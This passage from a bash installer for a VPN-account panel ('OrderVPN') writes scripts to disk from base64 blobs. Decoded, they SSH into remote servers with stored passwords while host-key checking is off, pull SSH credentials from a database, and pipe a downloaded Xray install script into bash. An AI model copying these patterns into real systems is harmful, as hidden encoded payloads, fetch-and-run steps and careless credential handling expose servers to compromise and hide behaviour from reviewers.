B0byB0YXJnZXQKICAgICAgICA6IGRlcGxveV9yZXN1bHQKICAgICAgICBkZXBsb3lfcmVzdWx0PSQoU1NIUEFTUz0iJHRhcmdldF9wYXNzIiBzc2hwYXNzIC1lIHNzaCAtcCAiJHRhcmdldF9wb3J0IiAtbyBTdHJpY3RIb3N0S2V5Q2hlY2tpbmc9bm8gLW8gQ29ubmVjdFRpbWVvdXQ9MTUgIiR7dGFyZ2V0X3VzZXJ9QCR7dGFyZ2V0X2lwfSIgJ2Jhc2ggLXMnIDwgL3Vzci9sb2NhbC9iaW4vaW5zdGFsbC1yZW1vdGUuc2ggMj4vZGV2L251bGwpCiAgICAgICAgaWYgW1sgJD8gLWVxIDAgJiYgLW4gIiRkZXBsb3lfcmVzdWx0IiBdXTsgdGhlbgogICAgICAgICAgICAjIFRyeSB0byBleHRyYWN0IEpTT04gZnJvbSB0aGUgb3V0cHV0CiAgICAgICAgICAgIDoganNvbl9saW5lCiAgICAgICAgICAgIGpzb25fbGluZT0kKGVjaG8gIiRkZXBsb3lfcmVzdWx0IiB8IGdyZXAgLUUgJ15ceyJzdWNjZXNzIicgfCB0YWlsIC0xKQogICAgICAgICAgICBpZiBbWyAtbiAiJGpzb25fbGluZSIgXV07IHRoZW4KICAgICAgICAgICAgICAgIGVjaG8gIiRqc29uX2xpbmUiCiAgICAgICAgICAgIGVsc2UKICAgICAgICAgICAgICAgIGVjaG8gJ3sic3VjY2VzcyI6dHJ1ZSwiaXAiOiInJHRhcmdldF9pcCciLCJtZXNzYWdlIjoiQnJpZGdlIGluc3RhbGxlZCBidXQgY291bGQgbm90IGF1dG8tZGV0ZWN0IGRldGFpbHMuIENoZWNrIC90bXAvb3JkZXJ2cG4tcmVtb3RlLWluc3RhbGwubG9nIG9uIHJlbW90ZSBWUFMuIn0nCiAgICAgICAgICAgIGZpCiAgICAgICAgZWxzZQogICAgICAgICAgICBlY2hvICd7InN1Y2Nlc3MiOmZhbHNlLCJtZXNzYWdlIjoiR2FnYWwga29uZWtzaSBrZSAnJHRhcmdldF9pcCcuIFBhc3Rpa2FuIElQLCB1c2VyLCBkYW4gcGFzc3dvcmQgYmVuYXIuIFBvcnQgU1NIIGhhcnVzIDIyLiJ9JwogICAgICAgIGZpCiAgICAgICAgZXhpdCAwCiAgICAgICAgOzsKCiAgICBtb25pdG9yfGhlYWx0aCkKICAgICAgICAjID09PT09IFNFUlZFUiBIRUFMVEggQ0hFQ0sgPT09PT0KICAgICAgICAjIFJldHVybnM6IHBpbmcsIHVwdGltZSwgQ1BVLCBSQU0sIGRpc2ssIGFjY291bnQgY291bnRzLCBzZXJ2aWNlIHN0YXR1cwogICAgICAgIDogcGluZ19tcyB1cHRpbWVfc3RyIGNwdV9sb2FkIHJhbV9wY3QgZGlza19wY3QKICAgICAgICA6IHNzaF9jb3VudCB2bWVzc19jb3VudCB2bGVzc19jb3VudCB0cm9qYW5fY291bnQKCiAgICAgICAgCiAgICAgICAgIyA9PT0gTVVMVEktVlBTOiBKaWthIC0tc2VydmVyLCBTU0gga2UgcmVtb3RlID09PQogICAgICAgIGlmIFtbIC1uICIkU0VSVkVSX0NPREUiIF1dOyB0aGVuCiAgICAgICAgICAgIHJlbW90ZV9leGVjICIkU0VSVkVSX0NPREUiICJtb25pdG9yIiAibm9uZSIgIm5vbmUiICIwIiAiMCIgIjAiCiAgICAgICAgICAgIGV4aXQgJD8KICAgICAgICBmaQojIC0tLSBQaW5nIChsb2NhbGhvc3QpIC0tLQogICAgICAgIHBpbmdfbXM9JChwaW5nIC1jIDEgLVcgMiA4LjguOC44IDI+L2Rldi9udWxsIHwgYXdrIC1GJy8nICdFTkR7cHJpbnQgJDV9JyB8IGN1dCAtZC4gLWYxKQogICAgICAgIFtbIC16ICIkcGluZ19tcyIgXV0gJiYgcGluZ19tcz0iTi9BIgoKICAgICAgICAjIC0tLSBVcHRpbWUgLS0tCiAgICAgICAgdXB0aW1lX3N0cj0kKHVwdGltZSAtcCAyPi9kZXYvbnVsbCB8IHNlZCAncy91cCAvLycpCgogICAgICAgICMgLS0tIENQVSBMb2FkICgxLW1pbiBhdmVyYWdlKSAtLS0KICAgICAgICBjcHVfbG9hZD0kKGF3ayAtdiBuPSQobnByb2MpICd7cHJpbnRmICIlLjBmIiwgJDEqMTAwL259JyAvcHJvYy9sb2FkYXZnIDI+L2Rldi9udWxsKQogICAgICAgIFtbIC16ICIkY3B1X2xvYWQiIF1dICYmIGNwdV9sb2FkPSJOL0EiCgogICAgICAgICMgLS0tIFJBTSAtLS0KICAgICAgICA6IHJhbV9pbmZvCiAgICAgICAgcmFtX2luZm89JChmcmVlIC1tIDI+L2Rldi9udWxsIHwgYXdrICcvTWVtOi97cHJpbnRmICIlZC8lZCAlLjBmIiwkMywkMiwoJDMvJDIpKjEwMH0nKQogICAgICAgIHJhbV9wY3Q9JChlY2hvICIkcmFtX2luZm8iIHwgYXdrICd7cHJpbnQgJDN9JykKICAgICAgICBbWyAteiAiJHJhbV9wY3QiIF1dICYmIHJhbV9wY3Q9Ik4vQSIKCiAgICAgICAgIyAtLS0gRGlzayAtLS0KICAgICAgICBkaXNrX3BjdD0kKGRmIC1oIC8gMj4vZGV2L251bGwgfCBhd2sgJ05SPT0ye3ByaW50ICQ1fScgfCB0ciAtZCAnJScpCiAgICAgICAgW1sgLXogIiRkaXNrX3BjdCIgXV0gJiYgZGlza19wY3Q9Ik4vQSIKCiAgICAgICAgIyAtLS0gQWNjb3VudCBjb3VudHMgLS0tCiAgICAgICAgc3NoX2NvdW50PSQobHMgIiRBS1VOX0RJUiIvc3NoLSoudHh0IDI+L2Rldi9udWxsIHwgd2MgLWwpCiAgICAgICAgdm1lc3NfY291bnQ9JChscyAiJEFLVU5fRElSIi92bWVzcy0qLnR4dCAyPi9kZXYvbnVsbCB8IHdjIC1sKQogICAgICAgIHZsZXNzX2NvdW50PSQobHMgIiRBS1VOX0RJUiIvdmxlc3MtKi50eHQgMj4vZGV2L251bGwgfCB3YyAtbCkKICAgICAgICB0cm9qYW5fY291bnQ9JChscyAiJEFLVU5fRElSIi90cm9qYW4tKi50eHQgMj4vZGV2L251bGwgfCB3YyAtbCkKCiAgICAgICAgIyAtLS0gU2VydmljZSBzdGF0dXMgLS0tCiAgICAgICAgOiB4cmF5X3N0YXR1cyBuZ2lueF9zdGF0dXMgc3NoX3N2Y19zdGF0dXMKICAgICAgICB4cmF5X3N0YXR1cz0kKHN5c3RlbWN0bCBpcy1hY3RpdmUgeHJheSAyPi9kZXYvbnVsbCB8fCBlY2hvICJpbmFjdGl2ZSIpCiAgICAgICAgbmdpbnhfc3RhdHVzPSQoc3lzdGVtY3RsIGlzLWFjdGl2ZSBuZ2lueCAyPi9kZXYvbnVsbCB8fCBlY2hvICJpbmFjdGl2ZSIpCiAgICAgICAgc3NoX3N2Y19zdGF0dXM9JChzeXN0ZW1jdGwgaXMtYWN0aXZlIHNzaCAyPi9kZXYvbnVsbCB8fCBzeXN0ZW1jdGwgaXMtYWN0aXZlIHNzaGQgMj4vZGV2L251bGwgfHwgZWNobyAiaW5hY3RpdmUiKQoKICAgICAgICAjIC0tLSBJUCAmIERvbWFpbiAtLS0KICAgICAgICA6IG1vbl9pcCBtb25fZG9tYWluCiAgICAgICAgbW9uX2lwPSQoY3VybCAtNCAtcyAtLW1heC10aW1lIDMgaWZjb25maWcubWUgMj4vZGV2L251bGwgfHwgaG9zdG5hbWUgLUkgfCBhd2sgJ3twcmludCAkMX0nKQogICAgICAgIG1vbl9kb21haW49JChjYXQgL3Jvb3QvZG9tYWluIDI+L2Rldi9udWxsIHwgdHIgLWQgJ1xuXHInIHwgeGFyZ3MpCgogICAgICAgIHByaW50ZiAneyJzdWNjZXNzIjp0cnVlLCJwaW5nX21zIjoiJXMiLCJ1cHRpbWUiOiIlcyIsImNwdSI6IiVzJSUiLCJyYW0iOiIlcyUlIiwiZGlzayI6IiVzJSUiLCJzc2hfY291bnQiOiVkLCJ2bWVzc19jb3VudCI6JWQsInZsZXNzX2NvdW50IjolZCwidHJvamFuX2NvdW50IjolZCwieHJheSI6IiVzIiwibmdpbngiOiIlcyIsInNzaCI6IiVzIiwiaXAiOiIlcyIsImRvbWFpbiI6IiVzIn1cbicgICAgICAgICAgICAgIiRwaW5nX21zIiAiJHVwdGltZV9zdHIiICIkY3B1X2xvYWQiICIkcmFtX3BjdCIgIiRkaXNrX3BjdCIgICAgICAgICAgICAgIiRzc2hfY291bnQiICIkdm1lc3NfY291bnQiICIkdmxlc3NfY291bnQiICIkdHJvamFuX2NvdW50IiAgICAgICAgICAgICAiJHhyYXlfc3RhdHVzIiAiJG5naW54X3N0YXR1cyIgIiRzc2hfc3ZjX3N0YXR1cyIgICAgICAgICAgICAgIiRtb25faXAiICIkbW9uX2RvbWFpbiIKICAgICAgICBleGl0IDAKICAgICAgICA7OwoKICAgICopIGVjaG8gJ3sic3VjY2VzcyI6ZmFsc2UsIm1lc3NhZ2UiOiJBY3Rpb24gdGlkYWsgZGlrZW5hbCJ9JyA7Owplc2FjCg==" | base64 -d > "$BRIDGE"



    chmod +x "$BRIDGE"



    # === VPN-API REMOTE INSTALLER (deployed to remote VPS) ===

    local REMOTE_INSTALLER="/usr/local/bin/install-remote.sh"

    echo "IyEvYmluL2Jhc2gKIyA9PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT0KIyBPcmRlclZQTiBSZW1vdGUgSW5zdGFsbGVyIHYxLjAKIyBEaXBhbmdnaWwgdmlhIFNTSCBkYXJpIFZQUyBNYXN0ZXIKIyBIYW55YSBpbnN0YWxsIHZwbi1hcGkgYnJpZGdlICsgZGVwZW5kZW5jaWVzCiMgPT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09CnNldCAtdW8gcGlwZWZhaWwKZXhwb3J0IERFQklBTl9GUk9OVEVORD1ub25pbnRlcmFjdGl2ZQoKTE9HX0ZJTEU9Ii90bXAvb3JkZXJ2cG4tcmVtb3RlLWluc3RhbGwubG9nIgpleGVjID4gIiRMT0dfRklMRSIgMj4mMQoKZWNobyAiPT09IE9yZGVyVlBOIFJlbW90ZSBJbnN0YWxsZXIgPT09IgplY2hvICJTdGFydGVkOiAkKGRhdGUpIgoKIyAtLS0gRGV0ZWN0IE9TIC0tLQppZiBbIC1mIC9ldGMvb3MtcmVsZWFzZSBdOyB0aGVuCiAgICAuIC9ldGMvb3MtcmVsZWFzZQogICAgT1M9IiR7UFJFVFRZX05BTUU6LVVua25vd259IgplbHNlCiAgICBPUz0iVW5rbm93biIKZmkKCiMgLS0tIEdldCBJUCAtLS0KSVBfVlBTPSQoY3VybCAtNCAtcyAtLW1heC10aW1lIDUgaWZjb25maWcubWUgMj4vZGV2L251bGwgfHwgaG9zdG5hbWUgLUkgfCBhd2sgJ3twcmludCAkMX0nKQplY2hvICJJUDogJElQX1ZQUyIKCiMgLS0tIEluc3RhbGwgZGVwZW5kZW5jaWVzIC0tLQplY2hvICJJbnN0YWxsaW5nIGRlcGVuZGVuY2llcy4uLiIKYXB0LWdldCB1cGRhdGUgLXFxIDI+L2Rldi9udWxsIHx8IHRydWUKCiMgRXNzZW50aWFsOiBqcSwgeHJheSwgc3NocGFzcywgbmdpbngsIG15c3FsLWNsaWVudApmb3IgcGtnIGluIGpxIG5naW54IGN1cmwgb3BlbnNzaC1zZXJ2ZXIgbXlzcWwtY2xpZW50OyBkbwogICAgaWYgISBjb21tYW5kIC12ICIke3BrZ30iID4vZGV2L251bGwgMj4mMSAmJiAhIGRwa2cgLWwgIiR7cGtnfSIgMj4vZGV2L251bGwgfCBncmVwIC1xICdeaWknOyB0aGVuCiAgICAgICAgYXB0LWdldCBpbnN0YWxsIC15ICIkcGtnIiA+L2Rldi9udWxsIDI+JjEgfHwgdHJ1ZQogICAgZmkKZG9uZQoKIyBJbnN0YWxsIHNzaHBhc3MKaWYgISBjb21tYW5kIC12IHNzaHBhc3MgPi9kZXYvbnVsbCAyPiYxOyB0aGVuCiAgICBhcHQtZ2V0IGluc3RhbGwgLXkgc3NocGFzcyA+L2Rldi9udWxsIDI+JjEgfHwgdHJ1ZQpmaQoKIyBJbnN0YWxsIFhyYXkgaWYgbm90IHByZXNlbnQKaWYgISBjb21tYW5kIC12IHhyYXkgPi9kZXYvbnVsbCAyPiYxOyB0aGVuCiAgICBlY2hvICJJbnN0YWxsaW5nIFhyYXkuLi4iCiAgICBiYXNoIC1jICIkKGN1cmwgLXNMIGh0dHBzOi8vZ2l0aHViLmNvbS9YVExTL1hyYXktaW5zdGFsbC9yYXcvbWFpbi9pbnN0YWxsLXJlbGVhc2Uuc2gpIiBAIGluc3RhbGwgLS12ZXJzaW9uIDEuOC4yMyA+L2Rldi9udWxsIDI+JjEgfHwgdHJ1ZQpmaQoKIyAtLS0gQ3JlYXRlIGRpcmVjdG9yaWVzIC0tLQpta2RpciAtcCAvcm9vdC9ha3VuIC92YXIvd3d3L2h0bWwgL3Vzci9sb2NhbC9ldGMveHJheSAvdmFyL2xvZy94cmF5IC90bXAvdnBuLWFwaS1ybApjaG1vZCA3NTUgL3Jvb3QvYWt1biAvdmFyL3d3dy9odG1sCgojIC0tLSBHZW5lcmF0ZSBYcmF5IGNvbmZpZyBpZiBtaXNzaW5nIC0tLQppZiBbICEgLWYgL3Vzci9sb2NhbC9ldGMveHJheS9jb25maWcuanNvbiBdOyB0aGVuCiAgICBjYXQgPiAvdXNyL2xvY2FsL2V0Yy94cmF5L2NvbmZpZy5qc29uIDw8ICdYUkFZRU9GJwp7CiAgImxvZyI6IHsiYWNjZXNzIjogIi92YXIvbG9nL3hyYXkvYWNjZXNzLmxvZyIsImVycm9yIjogIi92YXIvbG9nL3hyYXkvZXJyb3IubG9nIiwibG9nbGV2ZWwiOiAid2FybmluZyJ9LAogICJpbmJvdW5kcyI6IFsKICAgIHsicG9ydCI6ODA4MCwicHJvdG9jb2wiOiJ2bWVzcyIsInNldHRpbmdzIjp7ImNsaWVudHMiOltdfSwic3RyZWFtU2V0dGluZ3MiOnsibmV0d29yayI6IndzIiwid3NTZXR0aW5ncyI6eyJwYXRoIjoiL3ZtZXNzIn19LCJzbmlmZmluZyI6eyJlbmFibGVkIjp0cnVlfSwidGFnIjoidm1lc3Mtd3MifSwKICAgIHsicG9ydCI6ODA4MSwicHJvdG9jb2wiOiJ2bGVzcyIsInNldHRpbmdzIjp7ImNsaWVudHMiOltdLCJkZWNyeXB0aW9uIjoibm9uZSJ9LCJzdHJlYW1TZXR0aW5ncyI6eyJuZXR3b3JrIjoid3MiLCJ3c1NldHRpbmdzIjp7InBhdGgiOiIvdmxlc3MifX0sInNuaWZmaW5nIjp7ImVuYWJsZWQiOnRydWV9LCJ0YWciOiJ2bGVzcy13cyJ9LAogICAgeyJwb3J0Ijo4MDgyLCJwcm90b2NvbCI6InRyb2phbiIsInNldHRpbmdzIjp7ImNsaWVudHMiOltdfSwic3RyZWFtU2V0dGluZ3MiOnsibmV0d29yayI6IndzIiwid3NTZXR0aW5ncyI6eyJwYXRoIjoiL3Ryb2phbiJ9fSwic25pZmZpbmciOnsiZW5hYmxlZCI6dHJ1ZX0sInRhZyI6InRyb2phbi13cyJ9LAogICAgeyJwb3J0Ijo4NDQ0LCJwcm90b2NvbCI6InZtZXNzIiwic2V0dGluZ3MiOnsiY2xpZW50cyI6W119LCJzdHJlYW1TZXR0aW5ncyI6eyJuZXR3b3JrIjoiZ3JwYyIsImdycGNTZXR0aW5ncyI6eyJzZXJ2aWNlTmFtZSI6InZtZXNzLWdycGMifX0sInRhZyI6InZtZXNzLWdycGMifSwKICAgIHsicG9ydCI6ODQ0NSwicHJvdG9jb2wiOiJ2bGVzcyIsInNldHRpbmdzIjp7ImNsaWVudHMiOltdLCJkZWNyeXB0aW9uIjoibm9uZSJ9LCJzdHJlYW1TZXR0aW5ncyI6eyJuZXR3b3JrIjoiZ3JwYyIsImdycGNTZXR0aW5ncyI6eyJzZXJ2aWNlTmFtZSI6InZsZXNzLWdycGMifX0sInRhZyI6InZsZXNzLWdycGMifSwKICAgIHsicG9ydCI6ODQ0NiwicHJvdG9jb2wiOiJ0cm9qYW4iLCJzZXR0aW5ncyI6eyJjbGllbnRzIjpbXX0sInN0cmVhbVNldHRpbmdzIjp7Im5ldHdvcmsiOiJncnBjIiwiZ3JwY1NldHRpbmdzIjp7InNlcnZpY2VOYW1lIjoidHJvamFuLWdycGMifX0sInRhZyI6InRyb2phbi1ncnBjIn0KICBdLAogICJvdXRib3VuZHMiOiBbeyJwcm90b2NvbCI6ImZyZWVkb20iLCJ0YWciOiJkaXJlY3QifSx7InByb3RvY29sIjoiYmxhY2tob2xlIiwic2V0dGluZ3MiOnt9LCJ0YWciOiJibG9jayJ9XSwKICAicm91dGluZyI6IHsiZG9tYWluU3RyYXRlZ3kiOiJJUElmTm9uTWF0Y2giLCJydWxlcyI6W3sidHlwZSI6ImZpZWxkIiwiaXAiOlsiZ2VvaXA6cHJpdmF0ZSJdLCJvdXRib3VuZFRhZyI6ImJsb2NrIn1dfQp9ClhSQVlFT0YKICAgIGNobW9kIDY0NCAvdXNyL2xvY2FsL2V0Yy94cmF5L2NvbmZpZy5qc29uCiAgICBzeXN0ZW1jdGwgZW5hYmxlIHhyYXkgMj4vZGV2L251bGwKICAgIHN5c3RlbWN0bCByZXN0YXJ0IHhyYXkgMj4vZGV2L251bGwKZmkKCiMgLS0tIEluc3RhbGwgdnBuLWFwaSBicmlkZ2UgLS0tCkJSSURHRV9QQVRIPSIvdXNyL2xvY2FsL2Jpbi92cG4tYXBpIgoKY2F0ID4gIiRCUklER0VfUEFUSCIgPDwgJ0JSSURHRUVPRicKSXlFdlltbHVMMkpoYzJnS0l5QldVRTR0UVZCSklFSnlhV1JuWlNCMk1pNHdJT0tBbENCVFpXTjFjbWwwZVNCSVlYSmtaVzVsWkFvaklFaGhibmxoSUdScGNHRnVaMmRwYkNCMmFXRWdjM1ZrYnlCdmJHVm9JSGQzZHkxa1lYUmhDbk5sZENBdGRXOGdjR2x3WldaaGFXd0tDbGhTUVZsZlEwOU9Sa2xIUFNJdmRYTnlMMnh2WTJGc0wyVjBZeTk0Y21GNUwyTnZibVpwWnk1cWMyOXVJZ3BCUzFWT1gwUkpVajBpTDNKdmIzUXZZV3QxYmlJS1VGVkNURWxEWDBoVVRVdzlJaTkyWVhJdmQzZDNMMmgwYld3aUNreFBSMTlHU1V4RlBTSXZkbUZ5TDJ4dlp5OTJjRzR0WVhCcExteHZaeUlLQ2lNZ1BUMDlJRTFWVEZSSkxWWlFVem9nVTFOSUlGSkZUVTlVUlNCRldFVkRWVlJKVDA0Z1BUMDlDaU1nUkdsd1lXNW5aMmxzSUdwcGEyRWdMUzF6WlhKMlpYSWdQR052WkdVK0lHUnBZbVZ5YVd0aGJnb2pJQ0FnTVM0Z1VYVmxjbmtnWkdGMFlXSmhjMlVnZFc1MGRXc2dhM0psWkdWdWMybGhiQ0JUVTBnZ2MyVnlkbVZ5Q2lNZ0lDQXlMaUJUVTBnZ2EyVWdjbVZ0YjNSbElITmxjblpsY2lBbUlHcGhiR0Z1YTJGdUlIWndiaTFoY0drZ2VXRnVaeUJ6WVcxaENpTWdJQ0F6TGlCU1pYUjFjbTRnYUdGemFXeHVlV0VLY21WdGIzUmxYMlY0WldNb0tTQjdDaUFnSUNCc2IyTmhiQ0JqYjJSbFBTSWtNU0lnWVdOMGFXOXVQU0lrTWlJS0lDQWdJQ01nVTJGdWFYUnBlbVU2SUdWelkyRndaU0J6YVc1bmJHVWdjWFZ2ZEdWeklIVnVkSFZySUcxbGJtTmxaMkZvSUZOUlRDQnBibXBsWTNScGIyNEtJQ0FnSUd4dlkyRnNJSE5oWm1WZlkyOWtaVDBpSkh0amIyUmxMeThuTHljbmZTSWdjSEp2ZEc4OUlpUXpJaUIxYzJWeVBTSWtOQ0lnWkdGNWN6MGlKRFVpSUhGMWIzUmhQU0lrTmlJZ2FYQnNhVzFwZEQwaUpEY2lDZ29nSUNBZ0l5QlJkV1Z5ZVNCa1lYUmhZbUZ6WlNCMWJuUjFheUJUVTBnZ1kzSmxaR1Z1ZEdsaGJITUtJQ0FnSUd4dlkyRnNJR1JpWDJodmMzUWdaR0pmY0c5eWRDQnpjMmhmZFhObGNpQnpjMmhmY0dGemN5QnpjMmhmYTJWNUNpQWdJQ0JzYjJOaGJDQmtZbDl5WlhOMWJIUUtJQ0FnSUdSaVgzSmxjM1ZzZEQwa0tHMTVjM0ZzSUMxT0lDMUNJQzFsSUNJS0lDQWdJQ0FnSUNCVFJVeEZRMVFnYUc5emRDd2djRzl5ZEN3Z2MzTm9YM1Z6WlhJc0lFTlBRVXhGVTBORktITnphRjl3WVhOemQyOXlaQ3duSnlrc0lFTlBRVXhGVTBORktITnphRjlyWlhrc0p5Y3BDaUFnSUNBZ0lDQWdSbEpQVFNCelpYSjJaWEp6SUZkSVJWSkZJR052WkdWZmMyVnlkbVZ5SUQwZ0p5UnpZV1psWDJOdlpHVW5JRUZPUkNCemRHRjBkWE1nUFNBbmNtVmhaSGtuQ2lBZ0lDQWdJQ0FnVEVsTlNWUWdNUW9nSUNBZ0lpQnZjbVJsY25ad2JpQXlQaTlrWlhZdmJuVnNiQ2tLQ2lBZ0lDQnBaaUJiV3lBdGVpQWlKR1JpWDNKbGMzVnNkQ0lnWFYwN0lIUm9aVzRLSUNBZ0lDQWdJQ0JsWTJodklDZDdJbk4xWTJObGMzTWlPbVpoYkhObExDSnRaWE56WVdkbElqb2lVMlZ5ZG1WeUlDY2tZMjlrWlNjZ2RHbGtZV3NnWkdsMFpXMTFhMkZ1SUdGMFlYVWdiMlptYkdsdVpTSjlKd29nSUNBZ0lDQWdJSEpsZEhWeWJpQXhDaUFnSUNCbWFRb0tJQ0FnSUdSaVgyaHZjM1E5SkNobFkyaHZJQ0lrWkdKZmNtVnpkV3gwSWlCOElHRjNheUFuZTNCeWFXNTBJQ1F4ZlNjcENpQWdJQ0JrWWw5d2IzSjBQU1FvWldOb2J5QWlKR1JpWDNKbGMzVnNkQ0lnZkNCaGQyc2dKM3R3Y21sdWRDQWtNbjBuS1FvZ0lDQWdjM05vWDNWelpYSTlKQ2hsWTJodklDSWtaR0pmY21WemRXeDBJaUI4SUdGM2F5QW5lM0J5YVc1MElDUXpmU2NwQ2lBZ0lDQnpjMmhmY0dGemN6MGtLR1ZqYUc4Z0lpUmtZbDl5WlhOMWJIUWlJSHdnWVhkcklDZDdjSEpwYm5RZ0pEUjlKeWtLSUNBZ0lITnphRjlyWlhrOUpDaGxZMmh2SUNJa1pHSmZjbVZ6ZFd4MElpQjhJR0YzYXlBbmUzQnlhVzUwSUNRMWZTY3BDZ29nSUNBZ0l5Qkpibk4wWVd4c0lITnphSEJoYzNNZ2FtbHJZU0JpWld4MWJTQmhaR0VnS0doaGJubGhJR0oxZEhWb0lHSmxZbVZ5WVhCaElHUmxkR2xySUhCbGNuUmhiV0VnYTJGc2FTa0tJQ0FnSUdsbUlDRWdZMjl0YldGdVpDQXRkaUJ6YzJod1lYTnpJRDR2WkdWMkwyNTFiR3dnTWo0bU1Uc2dkR2hsYmdvZ0lDQWdJQ0FnSUdGd2RDMW5aWFFnYVc1emRHRnNiQ0F0ZVNCemMyaHdZWE56SUQ0dlpHVjJMMjUxYkd3Z01qNG1NU0I4ZkNCMGNuVmxDaUFnSUNCbWFRb0tJQ0FnSUNNZ1VHbHNhV2dnYldWMGIyUmxJR0YxZEdnNklGTlRTQ0JyWlhrZ1BpQndZWE56ZDI5eVpBb2dJQ0FnYkc5allXd2djM05vWDJOdFpBb2dJQ0FnYVdZZ1cxc2dMVzRnSWlSemMyaGZhMlY1SWlBbUppQXRaaUFpSkhOemFGOXJaWGtpSUYxZE95QjBhR1Z1Q2lBZ0lDQWdJQ0FnYzNOb1gyTnRaRDBpYzNOb0lDMXBJQ2NrYzNOb1gydGxlU2NnTFhBZ0pHUmlYM0J2Y25RZ0xXOGdVM1J5YVdOMFNHOXpkRXRsZVVOb1pXTnJhVzVuUFc1dklDMXZJRU52Ym01bFkzUlVhVzFsYjNWMFBURXdJQzF2SUVKaGRHTm9UVzlrWlQxNVpYTWdKSHR6YzJoZmRYTmxjbjFBSkh0a1lsOW9iM04wZlNJS0lDQWdJR1ZzYVdZZ1cxc2dMVzRnSWlSemMyaGZjR0Z6Y3lJZ1hWMDdJSFJvWlc0S0lDQWdJQ0FnSUNCemMyaGZZMjFrUFNKVFUwaFFRVk5UUFNja2MzTm9YM0JoYzNNbklITnphSEJoYzNNZ0xXVWdjM05vSUMxd0lDUmtZbDl3YjNKMElDMXZJRk4wY21samRFaHZjM1JMWlhsRGFHVmphMmx1WnoxdWJ5QXRieUJEYjI1dVpXTjBWR2x0Wlc5MWREMHhNQ0FrZTNOemFGOTFjMlZ5ZlVBa2UyUmlYMmh2YzNSOUlnb2dJQ0FnWld4elpRb2dJQ0FnSUNBZ0lHVmphRzhnSjNzaWMzVmpZMlZ6Y3lJNlptRnNjMlVzSW0xbGMzTmhaMlVpT2lKVFpYSjJaWElnSnlSamIyUmxKeUIwYVdSaGF5QndkVzU1WVNCd1lYTnpkMjl5WkNCaGRHRjFJRk5UU0NCclpYa2lmU2NLSUNBZ0lDQWdJQ0J5WlhSMWNtNGdNUW9nSUNBZ1pta0tDaUFnSUNBaklFSmhibWQxYmlCamIyMXRZVzVrSUhKbGJXOTBaVG9nZG5CdUxXRndhU0E4WVdOMGFXOXVQaUE4Y0hKdmRHOCtJRHgxYzJWeVBpQThaR0Y1Y3o0Z1BIRjFiM1JoUGlBOGFYQnNhVzFwZEQ0S0lDQWdJR3h2WTJGc0lISmxiVzkwWlY5aGNtZHpQU0lrWVdOMGFXOXVJQ1J3Y205MGJ5QWtkWE5sY2lBa1pHRjVjeUFrY1hWdmRHRWdKR2x3YkdsdGFYUWlDaUFnSUNCc2IyTmhiQ0J5WlcxdmRHVmZiM1YwY0hWMENpQWdJQ0J5WlcxdmRHVmZiM1YwY0hWMFBTUW9aWFpoYkNBaUpITnphRjlqYldRZ0ozTjFaRzhnTDNWemNpOXNiMk5oYkM5aWFXNHZkbkJ1TFdGd2FTQWtjbVZ0YjNSbFgyRnlaM01uSWlBeVBpOWtaWFl2Ym5Wc2JDa0tDaUFnSUNCcFppQmJXeUFrUHlBdFpYRWdNQ0FtSmlBdGJpQWlKSEpsYlc5MFpWOXZkWFJ3ZFhRaUlGMWRPeUIwYUdWdUNpQWdJQ0FnSUNBZ1pXTm9ieUFpSkhKbGJXOTBaVjl2ZFhSd2RYUWlDaUFnSUNBZ0lDQWdjbVYwZFhKdUlEQUtJQ0FnSUdWc2MyVUtJQ0FnSUNBZ0lDQmxZMmh2SUNkN0luTjFZMk5sYzNNaU9tWmhiSE5sTENKdFpYTnpZV2RsSWpvaVIyRm5ZV3dnYTI5dVpXdHphU0JyWlNCelpYSjJaWElnSnlSamIyUmxKeUFvSnlSa1lsOW9iM04wT2lSa1lsOXdiM0owSnlrdUlGQmhjM1JwYTJGdUlITmxjblpsY2lCdmJteHBibVVnSmlCMmNHNHRZWEJwSUhSbGNtbHVjM1JoYkd3dUluMG5DaUFnSUNBZ0lDQWdjbVYwZFhKdUlERUtJQ0FnSUdacENuMEtDbEpNWDBSSlVqMGlMM1J0Y0M5MmNHNHRZWEJwTFhKc0lncERUMDVHU1VkZlRFOURTejBpTDNSdGNDOTJjRzR0WVhCcExXTnZibVpwWnk1c2IyTnJJZ29LVTBWU1ZrVlNYME5QUkVVOUlpSWdJQ0FnSUNBZ0lDQWdJQ0FnSUNBaklFMTFiSFJwTFZaUVV6b2dMUzF6WlhKMlpYSWdQR052WkdVK0NrRkRWRWxQVGowaUpERWlPeUJRVWs5VVQwTlBURDBpSkRJaU95QlZVMFZTVGtGTlJUMGlKRE1pT3lCRVFWbFRQU0lrTkNJN0lGRlZUMVJCUFNJa2V6VTZMVEV3TUgwaU95QkpVRXhKVFVsVVBTSWtlelk2TFRKOUlncERRVXhNUlZJOUlpUjdVMVZFVDE5VlUwVlNPaTExYm10dWIzZHVmU0lLQ2lNZ1BUMDlJRkJCVWxORklDMHRjMlZ5ZG1WeUlEeGpiMlJsUGlBOVBUMEtabTl5SUdrZ2FXNGdKQ2h6WlhFZ01TQWtJeWs3SUdSdkNpQWdJQ0JwWmlCYld5QWlKSHNoYVgwaUlEMDlJQ0l0TFhObGNuWmxjaUlnWFYwN0lIUm9aVzRLSUNBZ0lDQWdJQ0J1ZUhROUpDZ29hU3N4S1NrS0lDQWdJQ0FnSUNCVFJWSldSVkpmUTA5RVJUMGlKSHNoYm5oMGZTSUtJQ0FnSUNBZ0lDQWpJRWhoY0hWeklDMHRjMlZ5ZG1WeUlHUmhiaUJ1YVd4aGFXNTVZU0JrWVhKcElIQnZjMmwwYVc5dVlXd2djR0Z5WVcxekNpQWdJQ0FnSUNBZ2MyVjBJQzB0SUNJa2UwQTZNVHBwTFRGOUlpQWlKSHRBT201NGRDc3hmU0lLSUNBZ0lDQWdJQ0JCUTFSSlQwNDlJaVF4SWpzZ1VGSlBWRTlEVDB3OUlpUXlJanNnVlZORlVrNUJUVVU5SWlReklqc2dSRUZaVXowaUpEUWlPeUJSVlU5VVFUMGlKSHMxT2kweE1EQjlJanNnU1ZCTVNVMUpWRDBpSkhzMk9pMHlmU0lLSUNBZ0lDQWdJQ0JpY21WaGF3b2dJQ0FnWm1rS1pHOXVaUW9LSXlBOVBUMGdURTlIUjBsT1J5QTlQVDBLYkc5blgyVjJaVzUwS0NrZ2V3b2dJQ0FnYkc5allXd2djM1ZqWTJWemN6MGlKREVpSUcxelp6MGlKRElpQ2lBZ0lDQndjbWx1ZEdZZ0lsc2xjMTB